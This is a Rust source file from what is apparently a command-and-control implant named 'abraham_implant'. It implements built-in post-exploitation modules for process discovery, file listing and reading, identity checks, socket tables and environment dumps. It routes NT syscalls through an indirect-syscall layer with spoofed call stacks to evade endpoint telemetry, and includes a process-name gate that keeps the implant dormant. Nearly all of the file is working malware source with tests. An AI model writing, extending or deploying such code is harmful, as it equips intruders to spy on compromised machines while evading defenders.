//! In-process task modules (ABR-T011): built-in collection primitives
//! executed inside the implant on the session thread — no child
//! processes, no new threads. Routine post-exploitation needs (process
//! discovery, file listing, file read, self-identification, network
//! state, environment) no longer require `cmd.exe /C` shell tasks, whose
//! process-creation telemetry is the noisiest artifact of a classic C2.
//! NT-based modules dispatch through the indirect-syscall layer
//! (ABR-T005/T009/T010), so even the collection syscalls run with a
//! spoofed call stack.

use crate::evasion::syscalls;

/// Module names accepted by [`run`] — also the operator help line.
pub const NAMES: &str = "ps, ls <path>, cat <path>, whoami, netstat, env";

/// Runs a built-in module by name. `args` semantics are per module.
pub fn run(name: &str, args: &str) -> Result<Vec<u8>, String> {
    match name.trim() {
        "ps" => processes(),
        "ls" => listing(args.trim()),
        "cat" => read_file(args.trim()),
        "whoami" => whoami(),
        "netstat" => netstat(),
        "env" => environment(),
        other => Err(format!("unknown module '{other}' (available: {NAMES})")),
    }
}

const STATUS_INFO_LENGTH_MISMATCH: u32 = 0xC000_0004;
const SYSTEM_PROCESS_INFORMATION: usize = 5;

/// Process discovery through spoofed indirect
/// `NtQuerySystemInformation(SystemProcessInformation)` — TSV output:
/// pid, ppid, threads, handles, name, image path, command line. The
/// syscall returns the same data `tasklist` would show, with none of the
/// process/CONHOST telemetry; path and command line come from a
/// per-process `NtQueryInformationProcess` pass (protected processes
/// degrade to `-` columns).
fn processes() -> Result<Vec<u8>, String> {
    let query = unsafe { syscalls::resolve("NtQuerySystemInformation") }
        .ok_or_else(|| "NtQuerySystemInformation unresolved".to_string())?;
    let mut buffer = vec![0u8; 0x8000];
    let rows = loop {
        let mut needed = 0usize;
        let status = unsafe {
            syscalls::dispatch6(
                query,
                SYSTEM_PROCESS_INFORMATION, // class is the first argument
                buffer.as_mut_ptr() as usize,
                buffer.len(),
                &mut needed as *mut usize as usize,
                0,
                0,
            )
        };
        // NTSTATUS convention: the kernel returns the 32-bit code; treat
        // it as u32 before severity tests.
        let nt = status as u32 as i32;
        if nt >= 0 {
            break parse_processes(&buffer);
        }
        if nt as u32 != STATUS_INFO_LENGTH_MISMATCH {
            return Err(format!(
                "NtQuerySystemInformation failed: {:#010x}",
                nt as u32
            ));
        }
        buffer.resize(buffer.len() * 2, 0);
    };
    let mut out = String::from("pid\tppid\tthreads\thandles\tname\tpath\tcmdline\n");
    for row in rows {
        out.push_str(&row);
        out.push('\n');
    }
    Ok(out.into_bytes())
}

fn parse_processes(buffer: &[u8]) -> Vec<String> {
    let read_u16 = |off: usize| -> Option<u16> {
        buffer
            .get(off..off + 2)
            .map(|b| u16::from_le_bytes([b[0], b[1]]))
    };
    let read_u32 = |off: usize| -> Option<u32> {
        buffer
            .get(off..off + 4)
            .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
    };
    let read_usize = |off: usize| -> Option<usize> {
        buffer.get(off..off + 8).map(|b| {
            let mut bytes = [0u8; 8];
            bytes.copy_from_slice(b);
            usize::from_le_bytes(bytes)
        })
    };
    let mut rows = Vec::new();
    let mut offset = 0usize;
    while let Some(next) = read_u32(offset) {
        let threads = read_u32(offset + 4).unwrap_or(0);
        // SYSTEM_PROCESS_INFORMATION (x64): ImageName UNICODE_STRING at
        // +0x38 (Length) / +0x40 (Buffer), UniqueProcessId +0x50,
        // InheritedFromUniqueProcessId +0x58, HandleCount +0x60.
        let name_len = read_u16(offset + 0x38).unwrap_or(0) as usize;
        let name_ptr = read_usize(offset + 0x40).unwrap_or(0);
        let pid = read_usize(offset + 0x50).unwrap_or(0);
        let ppid = read_usize(offset + 0x58).unwrap_or(0);
        let handles = read_u32(offset + 0x60).unwrap_or(0);
        let name = if name_len > 0 && name_ptr != 0 {
            read_utf16z(name_ptr, name_len)
        } else {
            "System".to_string()
        };
        let (path, cmdline) = query_process_details(pid as u64);
        rows.push(format!(
            "{pid}\t{ppid}\t{threads}\t{handles}\t{name}\t{path}\t{cmdline}"
        ));
        if next == 0 {
            break;
        }
        offset += next as usize;
    }
    rows
}

/// True when any named process is running (case-insensitive, name only
/// — no per-process queries). The environment gate (T035) polls this
/// before first contact and while dormant.
pub fn any_process_running(names: &[String]) -> bool {
    if names.is_empty() {
        return false;
    }
    let Some(query) = (unsafe { syscalls::resolve("NtQuerySystemInformation") }) else {
        return false;
    };
    let mut buffer = vec![0u8; 0x8000];
    loop {
        let mut needed = 0usize;
        let status = unsafe {
            syscalls::dispatch6(
                query,
                SYSTEM_PROCESS_INFORMATION,
                buffer.as_mut_ptr() as usize,
                buffer.len(),
                &mut needed as *mut usize as usize,
                0,
                0,
            )
        };
        let nt = status as u32 as i32;
        if nt < 0 && nt as u32 == STATUS_INFO_LENGTH_MISMATCH {
            buffer.resize(buffer.len() * 2, 0);
            continue;
        }
        if nt < 0 {
            return false;
        }
        break;
    }
    // Walk the same SYSTEM_PROCESS_INFORMATION chain as `ps`, comparing
    // image names only.
    let read_u16 = |off: usize| -> Option<u16> {
        buffer
            .get(off..off + 2)
            .map(|b| u16::from_le_bytes([b[0], b[1]]))
    };
    let read_u32 = |off: usize| -> Option<u32> {
        buffer
            .get(off..off + 4)
            .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
    };
    let read_usize = |off: usize| -> Option<usize> {
        buffer.get(off..off + 8).map(|b| {
            let mut bytes = [0u8; 8];
            bytes.copy_from_slice(b);
            usize::from_le_bytes(bytes)
        })
    };
    let mut offset = 0usize;
    while let Some(next) = read_u32(offset) {
        let name_len = read_u16(offset + 0x38).unwrap_or(0) as usize;
        let name_ptr = read_usize(offset + 0x40).unwrap_or(0);
        let name = if name_len > 0 && name_ptr != 0 {
            read_utf16z(name_ptr, name_len)
        } else {
            "System".to_string()
        };
        if names
            .iter()
            .any(|want| want.trim().eq_ignore_ascii_case(&name))
        {
            return true;
        }
        if next == 0 {
            break;
        }
        offset += next as usize;
    }
    false
}

#[repr(C)]
#[derive(Default, Clone, Copy)]
struct ClientId {
    unique_process: usize,
    unique_thread: usize,
}

#[repr(C)]
#[derive(Default, Clone, Copy)]
struct ObjectAttributes {
    length: u32,
    root_directory: usize,
    object_name: usize,
    attributes: u32,
    security_descriptor: usize,
    security_quality_of_service: usize,
}

const PROCESS_QUERY_LIMITED_INFORMATION: usize = 0x1000;
const CURRENT_PROCESS: usize = usize::MAX;
const PROCESS_IMAGE_FILE_NAME: usize = 27;
const PROCESS_COMMAND_LINE: usize = 60;
const STATUS_MASK: u32 = 0x8000_0000;

/// (image path, command line) for one PID through
/// `NtQueryInformationProcess` on a QUERY_LIMITED handle; both `-` when
/// the process cannot be opened (protected) or the class is withheld.
fn query_process_details(pid: u64) -> (String, String) {
    let query = match unsafe { syscalls::resolve("NtQueryInformationProcess") } {
        Some(q) => q,
        None => return ("-".into(), "-".into()),
    };
    let close = match unsafe { syscalls::resolve("NtClose") } {
        Some(c) => c,
        None => return ("-".into(), "-".into()),
    };
    let handle = if pid == std::process::id() as u64 {
        CURRENT_PROCESS
    } else {
        let open = match unsafe { syscalls::resolve("NtOpenProcess") } {
            Some(o) => o,
            None => return ("-".into(), "-".into()),
        };
        let mut attributes = ObjectAttributes {
            length: std::mem::size_of::<ObjectAttributes>() as u32,
            ..Default::default()
        };
        let cid = ClientId {
            unique_process: pid as usize,
            unique_thread: 0,
        };
        let mut opened: usize = 0;
        let status = unsafe {
            syscalls::dispatch6(
                open,
                &mut opened as *mut usize as usize,
                PROCESS_QUERY_LIMITED_INFORMATION,
                &mut attributes as *mut ObjectAttributes as usize,
                &cid as *const ClientId as usize,
                0,
                0,
            )
        };
        if (status as u32) & STATUS_MASK != 0 || opened == 0 {
            return ("-".into(), "-".into());
        }
        opened
    };
    let owned = handle != CURRENT_PROCESS;
    let path = query_unicode_class(query, handle, PROCESS_IMAGE_FILE_NAME);
    let cmdline = query_unicode_class(query, handle, PROCESS_COMMAND_LINE);
    if owned {
        unsafe { syscalls::dispatch6(close, handle, 0, 0, 0, 0, 0) };
    }
    (path, cmdline)
}

/// One `NtQueryInformationProcess` call returning a UNICODE_STRING
/// written into our buffer; `-` on failure.
fn query_unicode_class(query: syscalls::Syscall, handle: usize, class: usize) -> String {
    let mut buffer = [0u8; 4096];
    let mut returned = 0usize;
    let status = unsafe {
        syscalls::dispatch6(
            query,
            handle,
            class,
            buffer.as_mut_ptr() as usize,
            buffer.len(),
            &mut returned as *mut usize as usize,
            0,
        )
    };
    if (status as u32) & STATUS_MASK != 0 {
        return "-".into();
    }
    // The kernel writes the UNICODE_STRING at buffer start; its Buffer
    // points inside the same allocation for these classes.
    let len = u16::from_le_bytes([buffer[0], buffer[1]]) as usize;
    let ptr = usize::from_le_bytes([
        buffer[8], buffer[9], buffer[10], buffer[11], buffer[12], buffer[13], buffer[14],
        buffer[15],
    ]);
    let start = buffer.as_ptr() as usize;
    if len == 0 || ptr < start || ptr + len > start + buffer.len() {
        return "-".into();
    }
    let offset = ptr - start;
    String::from_utf16_lossy(
        &buffer[offset..offset + len]
            .as_chunks::<2>()
            .0
            .iter()
            .map(|pair| u16::from_le_bytes(*pair))
            .collect::<Vec<u16>>(),
    )
}

/// Reads a null-terminated UTF-16 string from the system-information
/// buffer (the UNICODE_STRING lengths include the terminator).
fn read_utf16z(ptr: usize, byte_len: usize) -> String {
    let mut units = Vec::with_capacity(byte_len / 2);
    for step in 0..byte_len / 2 {
        let unit = unsafe {
            u16::from_le_bytes([
                std::ptr::read_volatile((ptr + step * 2) as *const u8),
                std::ptr::read_volatile((ptr + step * 2 + 1) as *const u8),
            ])
        };
        if unit == 0 {
            break;
        }
        units.push(unit);
    }
    String::from_utf16_lossy(&units)
}

/// Directory listing — TSV: type, size, name.
fn listing(path: &str) -> Result<Vec<u8>, String> {
    if path.is_empty() {
        return Err("ls requires a path".into());
    }
    let dir = std::fs::read_dir(path).map_err(|e| format!("{path}: {e}"))?;
    let mut rows: Vec<(bool, u64, String)> = Vec::new();
    for entry in dir {
        let entry = entry.map_err(|e| format!("{path}: {e}"))?;
        let meta = entry.metadata().map_err(|e| format!("{path}: {e}"))?;
        rows.push((
            meta.is_dir(),
            meta.len(),
            entry.file_name().to_string_lossy().into_owned(),
        ));
    }
    rows.sort_by(|a, b| a.2.cmp(&b.2));
    let mut out = String::from("type\tsize\tname\n");
    for (is_dir, len, name) in rows {
        out.push_str(if is_dir { "d\t" } else { "f\t" });
        out.push_str(&len.to_string());
        out.push('\t');
        out.push_str(&name);
        out.push('\n');
    }
    Ok(out.into_bytes())
}

/// Small-file read, capped so a fat target cannot balloon the result
/// into an endless chunk transfer (use the DOWNLOAD task for that).
const CAT_CAP: usize = 512 * 1024;

fn read_file(path: &str) -> Result<Vec<u8>, String> {
    if path.is_empty() {
        return Err("cat requires a path".into());
    }
    let mut data = std::fs::read(path).map_err(|e| format!("{path}: {e}"))?;
    if data.len() > CAT_CAP {
        data.truncate(CAT_CAP);
        data.extend_from_slice(b"\n[i] truncated at 512 KiB - use download\n");
    }
    Ok(data)
}

/// Self-identification from the process environment block plus the NT
/// registration primitives (real parent PID, token integrity, OS build).
fn whoami() -> Result<Vec<u8>, String> {
    let env = |key: &str| std::env::var(key).unwrap_or_default();
    let integrity = crate::selfinfo::integrity().unwrap_or(0);
    let integrity_name = match integrity {
        1 => "low",
        2 => "medium",
        3 => "high",
        4 => "system",
        5 => "protected",
        _ => "unknown",
    };
    Ok(format!(
        "{}\\{}@{}\npid={} ppid={} integrity={integrity_name}\nbuild={}\n",
        env("USERDOMAIN"),
        env("USERNAME"),
        env("COMPUTERNAME"),
        std::process::id(),
        crate::selfinfo::ppid().unwrap_or(0),
        crate::selfinfo::os_build().unwrap_or_default(),
    )
    .into_bytes())
}

/// Process environment block dump — `KEY=VALUE` per line, no API calls.
fn environment() -> Result<Vec<u8>, String> {
    let mut out = String::new();
    for (key, value) in std::env::vars_os() {
        out.push_str(&key.to_string_lossy());
        out.push('=');
        out.push_str(&value.to_string_lossy());
        out.push('\n');
    }
    Ok(out.into_bytes())
}

// --- netstat: owner-PID socket tables through iphlpapi ---

type ExtendedTableFn = unsafe extern "system" fn(*mut u8, *mut u32, i32, u32, u32, u32) -> u32;

const ERROR_INSUFFICIENT_BUFFER: u32 = 122;
const AF_INET: u32 = 2;
const AF_INET6: u32 = 23;
const TCP_TABLE_OWNER_PID_ALL: u32 = 5;
const UDP_TABLE_OWNER_PID_ALL: u32 = 1;

fn tcp_state(state: u32) -> &'static str {
    match state {
        2 => "LISTEN",
        3 => "SYN_SENT",
        4 => "SYN_RCVD",
        5 => "ESTAB",
        6 => "FIN_WAIT1",
        7 => "FIN_WAIT2",
        8 => "CLOSE_WAIT",
        9 => "CLOSING",
        10 => "LAST_ACK",
        11 => "TIME_WAIT",
        12 => "DELETE_TCB",
        _ => "UNKNOWN",
    }
}

/// IPv4 (v4-byte network-order u32) to dotted quad. Ports are stored in
/// network byte order in the low 16 bits of the DWORD.
fn dotted(addr: u32) -> String {
    format!(
        "{}.{}.{}.{}",
        addr & 0xff,
        (addr >> 8) & 0xff,
        (addr >> 16) & 0xff,
        (addr >> 24) & 0xff
    )
}

fn network_port(word: u32) -> u32 {
    ((word & 0xff) << 8) | ((word >> 8) & 0xff)
}

/// Compact IPv6 rendering: hextets lower-case hex with the longest
/// run of zero groups collapsed to `::` (RFC 5952 essentials).
fn ipv6(addr: &[u8]) -> String {
    let groups: Vec<u16> = (0..8)
        .map(|i| u16::from_be_bytes([addr[i * 2], addr[i * 2 + 1]]))
        .collect();
    let mut best = (0usize, 0usize); // (start, len) of longest zero run
    let mut run = (0usize, 0usize);
    for (i, group) in groups.iter().enumerate() {
        if *group == 0 {
            if run.1 == 0 {
                run.0 = i;
            }
            run.1 += 1;
            if run.1 > best.1 {
                best = run;
            }
        } else {
            run.1 = 0;
        }
    }
    if best.1 < 2 {
        best = (0, 0);
    }
    let head: Vec<String> = groups[..best.0].iter().map(|g| format!("{g:x}")).collect();
    let tail: Vec<String> = groups[best.0 + best.1..]
        .iter()
        .map(|g| format!("{g:x}"))
        .collect();
    if best.1 == 0 {
        head.join(":")
    } else {
        format!("{}::{}", head.join(":"), tail.join(":"))
    }
}

/// Calls GetExtended{Tcp,Udp}Table sized through the classic two-call
/// pattern; returns the raw table buffer.
fn extended_table(func: ExtendedTableFn, family: u32, table_class: u32) -> Result<Vec<u8>, String> {
    let mut size: u32 = 0;
    unsafe { func(std::ptr::null_mut(), &mut size, 1, family, table_class, 0) };
    if size == 0 {
        return Err("socket table size probe returned zero".into());
    }
    let mut buffer = vec![0u8; size as usize];
    let code = unsafe { func(buffer.as_mut_ptr(), &mut size, 1, family, table_class, 0) };
    if code == ERROR_INSUFFICIENT_BUFFER {
        return Err("socket table kept growing".into());
    }
    if code != 0 {
        return Err(format!("socket table query failed: {code}"));
    }
    Ok(buffer)
}

/// Listening/established sockets with owning PID — the in-process
/// counterpart of `netstat -ano` (IPv4; IPv6 tables are a follow-up).
fn netstat() -> Result<Vec<u8>, String> {
    let tcp_addr = unsafe { syscalls::export_address("iphlpapi.dll", "GetExtendedTcpTable") }
        .ok_or("GetExtendedTcpTable unresolved")?;
    let udp_addr = unsafe { syscalls::export_address("iphlpapi.dll", "GetExtendedUdpTable") }
        .ok_or("GetExtendedUdpTable unresolved")?;
    let tcp: ExtendedTableFn = unsafe { std::mem::transmute(tcp_addr) };
    let udp: ExtendedTableFn = unsafe { std::mem::transmute(udp_addr) };

    let mut out = String::from("proto\tlocal\tremote\tstate\tpid\n");
    if let Ok(table) = extended_table(tcp, AF_INET, TCP_TABLE_OWNER_PID_ALL) {
        let read_u32 = |off: usize| -> u32 {
            u32::from_le_bytes([table[off], table[off + 1], table[off + 2], table[off + 3]])
        };
        let entries = read_u32(0) as usize;
        for i in 0..entries {
            let row = 4 + i * 24; // MIB_TCPROW_OWNER_PID: 6 DWORDs
            if row + 24 > table.len() {
                break;
            }
            let state = read_u32(row);
            let local = read_u32(row + 4);
            let local_port = read_u32(row + 8);
            let remote = read_u32(row + 12);
            let remote_port = read_u32(row + 16);
            let pid = read_u32(row + 20);
            out.push_str(&format!(
                "tcp\t{}:{}\t{}:{}\t{}\t{pid}\n",
                dotted(local),
                network_port(local_port),
                dotted(remote),
                network_port(remote_port),
                tcp_state(state)
            ));
        }
    }
    // IPv6: TCP6 row = 16B local addr + scope + port, remote triple,
    // state, pid (56B); UDP6 row = addr + scope + port + pid (28B).
    if let Ok(table) = extended_table(tcp, AF_INET6, TCP_TABLE_OWNER_PID_ALL) {
        let read_u32 = |off: usize| -> u32 {
            u32::from_le_bytes([table[off], table[off + 1], table[off + 2], table[off + 3]])
        };
        let entries = read_u32(0) as usize;
        for i in 0..entries {
            let row = 4 + i * 56;
            if row + 56 > table.len() {
                break;
            }
            let state = read_u32(row + 48);
            let local_port = read_u32(row + 20);
            let remote_port = read_u32(row + 44);
            let pid = read_u32(row + 52);
            out.push_str(&format!(
                "tcp6	[{}]:{}	[{}]:{}	{}	{pid}
",
                ipv6(&table[row..row + 16]),
                network_port(local_port),
                ipv6(&table[row + 24..row + 40]),
                network_port(remote_port),
                tcp_state(state)
            ));
        }
    }
    if let Ok(table) = extended_table(udp, AF_INET6, UDP_TABLE_OWNER_PID_ALL) {
        let read_u32 = |off: usize| -> u32 {
            u32::from_le_bytes([table[off], table[off + 1], table[off + 2], table[off + 3]])
        };
        let entries = read_u32(0) as usize;
        for i in 0..entries {
            let row = 4 + i * 28;
            if row + 28 > table.len() {
                break;
            }
            let local_port = read_u32(row + 20);
            let pid = read_u32(row + 24);
            out.push_str(&format!(
                "udp6	[{}]:{}	-	-	{pid}
",
                ipv6(&table[row..row + 16]),
                network_port(local_port)
            ));
        }
    }
    if let Ok(table) = extended_table(udp, AF_INET, UDP_TABLE_OWNER_PID_ALL) {
        let read_u32 = |off: usize| -> u32 {
            u32::from_le_bytes([table[off], table[off + 1], table[off + 2], table[off + 3]])
        };
        let entries = read_u32(0) as usize;
        for i in 0..entries {
            let row = 4 + i * 12; // MIB_UDPROW_OWNER_PID: 3 DWORDs
            if row + 12 > table.len() {
                break;
            }
            let local = read_u32(row);
            let local_port = read_u32(row + 4);
            let pid = read_u32(row + 8);
            out.push_str(&format!(
                "udp\t{}:{}\t-\t-\t{pid}\n",
                dotted(local),
                network_port(local_port)
            ));
        }
    }
    Ok(out.into_bytes())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ps_lists_own_process_with_details() {
        // Runs NtQuerySystemInformation end-to-end through the spoofed
        // dispatcher — a real data-returning syscall on the synthetic
        // stack, not just a yield — plus the per-PID detail pass: the
        // implant's own row must carry its image path and command line.
        let out = processes().expect("ps module");
        let text = String::from_utf8_lossy(&out);
        assert!(
            text.starts_with("pid\tppid\tthreads\thandles\tname\tpath\tcmdline\n"),
            "unexpected header: {}",
            text.lines().next().unwrap_or_default()
        );
        let own = std::process::id().to_string();
        let row = text
            .lines()
            .find(|line| line.starts_with(&own) && line.contains("abraham_implant"))
            .expect("own process row missing");
        assert!(row.contains(".exe"), "own row lacks image path: {row}");
    }

    #[test]
    fn ls_and_cat_roundtrip() {
        let dir = std::env::temp_dir().join("abraham_module_test");
        std::fs::create_dir_all(&dir).expect("mkdir");
        std::fs::write(dir.join("note.txt"), b"hello modules").expect("write");
        let path = dir.to_str().expect("utf8 path");
        let listing = listing(path).expect("ls module");
        assert!(String::from_utf8_lossy(&listing).contains("note.txt"));
        let data = read_file(&format!("{path}\\note.txt")).expect("cat module");
        assert_eq!(data, b"hello modules");
    }

    #[test]
    fn unknown_module_lists_available() {
        let err = run("definitely-not", "").unwrap_err();
        assert!(
            err.contains("ps"),
            "error should name the available modules: {err}"
        );
    }

    #[test]
    fn whoami_mentions_own_pid_and_build() {
        let out = whoami().expect("whoami module");
        let text = String::from_utf8_lossy(&out);
        assert!(text.contains(&format!("pid={}", std::process::id())));
        assert!(text.contains("ppid="));
        assert!(text.contains("build=1"));
    }

    #[test]
    fn netstat_lists_something() {
        let out = netstat().expect("netstat module");
        let text = String::from_utf8_lossy(&out);
        assert!(text.starts_with("proto\tlocal\tremote\tstate\tpid\n"));
        assert!(text.contains("\ntcp\t"));
    }

    #[test]
    fn ipv6_formatter_matches_rfc5952_shapes() {
        assert_eq!(
            ipv6(&[0x20, 0x01, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1]),
            "2001::1"
        );
        assert_eq!(
            ipv6(&[0xfe, 0x80, 0, 0, 0, 0, 0, 0, 0x02, 0x11, 0x22, 0xff, 0xfe, 0x33, 0x44, 0x55]),
            "fe80::211:22ff:fe33:4455"
        );
        assert_eq!(ipv6(&[0; 16]), "::");
    }

    #[test]
    fn env_lists_path() {
        let out = environment().expect("env module");
        let text = String::from_utf8_lossy(&out);
        assert!(text.to_uppercase().contains("PATH="));
    }
}
